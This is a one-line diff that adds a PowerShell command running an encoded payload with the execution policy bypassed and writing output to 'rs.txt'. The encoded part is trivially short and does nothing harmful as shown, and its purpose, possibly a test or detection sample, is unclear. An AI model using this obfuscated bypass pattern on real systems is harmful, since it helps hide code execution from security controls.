@@ -1,0 +1,1 @@
+powershell -ep bypass -enc JgAg > rs.txt
